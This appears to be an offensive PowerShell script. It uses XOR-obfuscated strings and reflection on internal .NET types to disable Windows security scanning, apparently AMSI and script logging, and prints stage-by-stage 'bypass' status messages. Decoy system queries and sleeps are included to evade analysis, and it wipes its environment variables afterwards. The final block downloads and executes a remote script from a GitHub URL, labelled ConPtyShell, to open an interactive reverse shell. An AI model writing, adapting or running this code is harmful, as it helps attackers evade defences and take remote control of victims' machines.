$env:wOgeqznf = "7aXupeCl/KX6peml6qXmpeSl6aX6peil5KXmpe2l7KXrpeCl+aX2peql46XxpfKl5KX3peCl+aX1pcqlyaXMpcalzKXApdal+aXopcylxqXXpcql1qXKpcOl0aX5pfKlzKXLpcGlyqXSpdal+aX1pcql0qXApdel9qXNpcClyaXJpfml9qXGpdelzKXVpdGl56XJpcqlxqXOpemlyqXCpcKlzKXLpcKl"
$env:tAzi24Uu = "4KXLpcSlx6XJpcCl9qXGpdelzKXVpdGl56XJpcqlxqXOpemlyqXCpcKlzKXLpcKl"
$env:bHIInElC = "9qXcpdal0aXApcili6XopcSly6XEpcKlwKXIpcCly6XRpYul5KXQpdGlyqXIpcSl0aXMpcqly6WLpfCl0aXMpcml1qU="
$env:OzCND85Z = "4qXApdGl46XMpcClyaXBpQ=="
$env:lBiKGbrr = "9qXcpdal0aXApcili6XopcSly6XEpcKlwKXIpcCly6XRpYul5KXQpdGlyqXIpcSl0aXMpcqly6WLpeSlyKXWpcyl8KXRpcylyaXWpQ=="
$env:ZpEyipXq = "xqXEpcalzaXApcGl4qXXpcql0KXVpfWlyqXJpcylxqXcpfalwKXRpdGlzKXLpcKl1qU="
$env:YfohzeoU = "xKXIpdalzKXspculzKXRpeOlxKXMpcmlwKXBpQ=="
$env:nVEz6kFe = "4qXApdGl86XEpcml0KXApQ=="
$env:MvXfskRI = "9qXApdGl86XEpcml0KXApQ=="
$env:IrwTcb1a = "4qXApdGl8aXcpdWlwKU="

function fIFiSB($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=($b[$i] -bxor 132) -bxor 33};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$nid = fIFiSB 'IrwTcb1a'
$qc7 = fIFiSB 'OzCND85Z'
$fe2 = fIFiSB 'MvXfskRI'
$fnb = fIFiSB 'nVEz6kFe'
$x3f = [System.Reflection.BindingFlags]((0x8B -bxor 0xAB) + (0x5A -bxor 0x52))

$wmn = [Ref].Assembly

try {
  $null = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Name
  $null = (Get-WmiObject Win32_Processor).Name
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName -ErrorAction SilentlyContinue
  Start-Sleep -Milliseconds 57

  try {
    $d46 = fIFiSB 'bHIInElC'
    $rxn = $wmn.$nid($d46)
    $wmo = fIFiSB 'ZpEyipXq'
    $kiy = fIFiSB 'wOgeqznf'
    $x0i = $rxn.$qc7($wmo, $x3f)
    $jv3 = fIFiSB 'tAzi24Uu'
    $v6t = $x0i.$fnb($null)
    if ($v6t -eq $null) {
      $v6t = @{}
      $x0i.$fe2($null, $v6t)
    }
    $p5a = New-Object "System.Collections.Generic.Dictionary[string,object]"
    $p5a.Add($jv3, 0)
    $v6t[$kiy] = $p5a
    $kzv = $x0i.$fnb($null)
    if ($kzv -ne $null -and $kzv.ContainsKey($kiy) -and $kzv[$kiy][$jv3] -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  Start-Sleep -Milliseconds 143
  $null = [Environment]::OSVersion.Version
  $null = [System.IO.Path]::GetTempPath()
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption

  try {
    $h3t = fIFiSB 'lBiKGbrr'
    $utp = $wmn.$nid($h3t)
    $e38 = fIFiSB 'YfohzeoU'
    $xu7 = [System.DateTime]::Now.Ticks
    $q7k = $utp.$qc7($e38, $x3f)
    $q7k.$fe2($null, $true)
    $wdw = $q7k.$fnb($null)
    if ($wdw -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $fov = fIFiSB 'lBiKGbrr'
    $hiy = $wmn.$nid($fov)
    if ($hiy -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }

  Start-Sleep -Milliseconds 163
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  $null = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Name
}
finally {
  Remove-Item Env:\IrwTcb1a -ErrorAction SilentlyContinue
  Remove-Item Env:\OzCND85Z -ErrorAction SilentlyContinue
  Remove-Item Env:\MvXfskRI -ErrorAction SilentlyContinue
  Remove-Item Env:\nVEz6kFe -ErrorAction SilentlyContinue
  Remove-Item Env:\lBiKGbrr -ErrorAction SilentlyContinue
  Remove-Item Env:\YfohzeoU -ErrorAction SilentlyContinue
  Remove-Item Env:\bHIInElC -ErrorAction SilentlyContinue
  Remove-Item Env:\ZpEyipXq -ErrorAction SilentlyContinue
  Remove-Item Env:\wOgeqznf -ErrorAction SilentlyContinue
  Remove-Item Env:\tAzi24Uu -ErrorAction SilentlyContinue
}
    # ConPtyShell execution
    try {
        IEX(IWR https://raw.githubusercontent.com/rishieissocool/images/refs/heads/main/something.ps1 -UseBasicParsing);
    } catch {
        Write-Host "[!] 112 execution failed"
    }
    